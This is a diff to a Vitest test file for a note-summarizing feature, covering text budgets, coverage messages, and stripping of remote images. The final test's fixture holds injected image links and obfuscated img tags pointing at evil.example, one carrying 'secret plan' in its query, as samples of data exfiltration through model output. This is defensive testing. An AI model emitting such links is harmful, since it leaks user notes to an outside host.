@@ -1,7 +1,9 @@
 import { beforeEach, describe, expect, test, vi } from 'vitest'
+import { parseNoteMarkdown } from '@/ui/workspace/folder-container/widgets/markdown'
 import { MAX_SUMMARY_IMAGES, SUMMARY_TEXT_LIMIT, add_summary_note, build_summary_messages, collect_summary_sources, coverage_line, summary_entries, summary_note_name, summary_position } from './summarize'
 import { image_to_data_url } from './imageInput'
 import type { SummaryEntry } from './summarize'
+import { strip_remote_images, strip_think } from './text'
 
 vi.mock('./imageInput', () => ({
 	image_to_data_url: vi.fn(async (_: unknown, id: string) => (
@@ -51,7 +53,9 @@ describe('collect_summary_sources', () => {
 			{ name: 'b.md', text: 'Beta notes' },
 		])
 		expect(sources.images.map(image => image.name)).toEqual(['IMG_2.jpg', 'IMG_1.jpg'])
+		expect(sources.notes_full).toBe(2)
 		expect(sources.notes_total).toBe(2)
+		expect(coverage_line(sources)).toBeNull()
 		expect(sources.images_total).toBe(2)
 		expect(sources.images_refused).toBe(false)
 		expect(image_fn).toHaveBeenCalledTimes(2)
@@ -83,13 +87,32 @@ describe('collect_summary_sources', () => {
 		)
 	})
 
-	test('cuts note text to SUMMARY_TEXT_LIMIT and leaves a leftover note out rather than a stub', async () => {
-		const long = 'x'.repeat(SUMMARY_TEXT_LIMIT)
-		notes['/f/long.md'] = long
+	test('shares the text budget, so a long first note cannot crowd the next one out', async () => {
+		notes['/f/long.md'] = 'x'.repeat(SUMMARY_TEXT_LIMIT)
 		notes['/f/tail.md'] = 'y'.repeat(500)
 		const sources = await collect_summary_sources(workspace, [file('long.md'), file('tail.md')], { images_refused: false })
-		expect(sources.notes).toEqual([{ name: 'long.md', text: long }])
+		// max(MIN_NOTE_PART, floor(24000 / 2))
+		expect(sources.notes[0]).toEqual({ name: 'long.md', text: 'x'.repeat(12_000) })
+		expect(sources.notes[1]).toEqual({ name: 'tail.md', text: 'y'.repeat(500) })
+		expect(sources.notes_full).toBe(1)
 		expect(sources.notes_total).toBe(2)
+		expect(coverage_line(sources)).toBe('2 of 2 notes included, shortened to fit')
+	})
+
+	test('sends the beginning of every note when none of them fit whole', async () => {
+		const entries = Array.from({ length: 52 }, (_, i) => {
+			const name = `share-${i}.md`
+			notes[`/f/${name}`] = `n${i}:` + 'y'.repeat(2_000)
+			return file(name)
+		})
+		const sources = await collect_summary_sources(workspace, entries, { images_refused: false })
+		expect(sources.notes).toHaveLength(52)
+		expect(sources.notes_full).toBe(0)
+		expect(sources.notes_total).toBe(52)
+		// max(MIN_NOTE_PART, floor(24000 / 52))
+		expect(sources.notes[0]!.text).toHaveLength(461)
+		expect(sources.notes.every((note, i) => note.text.startsWith(`n${i}:`) && note.text.length >= 400)).toBe(true)
+		expect(coverage_line(sources)).toBe('52 of 52 notes included, shortened to fit')
 	})
 
 	test('an empty note is not counted as left out; an unreadable one is', async () => {
@@ -99,7 +122,9 @@ describe('collect_summary_sources', () => {
 			file('a.md'),
 		], { images_refused: false })
 		expect(sources.notes).toEqual([{ name: 'a.md', text: 'Alpha plan' }])
+		expect(sources.notes_full).toBe(1)
 		expect(sources.notes_total).toBe(2)
+		expect(coverage_line(sources)).toBe('1 of 2 notes included')
 	})
 
 	test('reports progress for every entry, and stops reading after abort', async () => {
@@ -125,6 +150,7 @@ describe('coverage_line', () => {
 		names: [] as string[],
 		notes: [] as { name: string; text: string }[],
 		images: [] as { name: string; url: string }[],
+		notes_full: 0,
 		notes_total: 0,
 		images_total: 0,
 		images_refused: false,
@@ -135,6 +161,7 @@ describe('coverage_line', () => {
 			...empty,
 			notes: [{ name: 'a.md', text: 'x' }],
 			images: [{ name: 'a.jpg', url: 'data:' }],
+			notes_full: 1,
 			notes_total: 1,
 			images_total: 1,
 		})).toBeNull()
@@ -145,6 +172,7 @@ describe('coverage_line', () => {
 			...empty,
 			images: Array.from({ length: 12 }, (_, i) => ({ name: `${i}.jpg`, url: 'data:' })),
 			notes: Array.from({ length: 30 }, (_, i) => ({ name: `${i}.md`, text: 'x' })),
+			notes_full: 30,
 			images_total: 40,
 			notes_total: 52,
 		})).toBe('12 of 40 images and 30 of 52 notes included')
@@ -158,10 +186,20 @@ describe('coverage_line', () => {
 		expect(coverage_line({
 			...empty,
 			notes: [{ name: 'a.md', text: 'x' }],
+			notes_full: 1,
 			notes_total: 52,
 			images_total: 40,
 			images_refused: true,
 		})).toBe("0 of 40 images and 1 of 52 notes included: the model doesn't accept images")
+	})
+
+	test('a shortened note is included, and the line says it was not whole', () => {
+		expect(coverage_line({
+			...empty,
+			notes: [{ name: 'long.md', text: 'x' }, { name: 'tail.md', text: 'y' }],
+			notes_full: 1,
+			notes_total: 2,
+		})).toBe('2 of 2 notes included, shortened to fit')
 	})
 })
 
@@ -171,6 +209,7 @@ describe('build_summary_messages', () => {
 			names: ['a.md', 'Trip/', 'shot.jpg'],
 			notes: [{ name: 'a.md', text: 'Alpha plan' }],
 			images: [],
+			notes_full: 1,
 			notes_total: 1,
 			images_total: 1,
 			images_refused: true,
@@ -196,6 +235,7 @@ describe('build_summary_messages', () => {
 				{ name: 'a.jpg', url: 'data:image/jpeg;base64,A' },
 				{ name: 'b.jpg', url: 'data:image/jpeg;base64,B' },
 			],
+			notes_full: 0,
 			notes_total: 0,
 			images_total: 2,
 			images_refused: false,
@@ -275,5 +315,39 @@ describe('add_summary_note', () => {
 		expect(ws.create_note).toHaveBeenCalledWith('/f', undefined)
 		expect(ws.save_note_content).toHaveBeenCalled()
 		expect(ws.rename).toHaveBeenCalled()
+	})
+
+	test('an injected remote image is gone from the preview and from the saved note', async () => {
+		const raw = [
+			'<think>mention the secret plan</think>',
+			'# Summary',
+			'- secret plan',
+			'![](https://evil.example/?q=secret%20plan)',
+			'![photo](https://evil.example/a_(1).png "shot")',
+			'<img src="https://evil.example/x.png" alt="x">',
+			'<img src="https&#58;//evil.example/y.png">',
+			'<img src="&#104;&#116;&#116;&#112;&#115;&#58;//evil.example/z.png">',
+			'<img src="https://evil.example/open',
+		].join('\n')
+		// What the dialog renders. Without the strip, the preview would load the address.
+		expect(parseNoteMarkdown('![](https://evil.example/a.png)')).toContain('https://evil.example')
+		const summary = strip_remote_images(strip_think(raw))
+		const summary_html = parseNoteMarkdown(summary)
+		expect(summary_html).not.toContain('https://')
+		expect(summary_html).not.toContain('evil.example')
+		expect(summary).not.toContain('https://')
+		expect(summary).not.toContain('evil.example')
+		expect(summary).toContain('secret plan')
+		expect(summary).toContain('photo')
+		expect(summary).not.toContain('<think')
+
+		const save = vi.fn(async () => {})
+		await add_summary_note({
+			create_note: vi.fn(async () => '/f/Note 1.md'),
+			save_note_content: save,
+			resolve_folder_data: () => ({ children: [] }),
+			rename: vi.fn(async () => {}),
+		} as never, '/f', raw, null)
+		expect(save).toHaveBeenCalledWith('/f/Note 1.md', `${summary}\n`)
 	})
 })
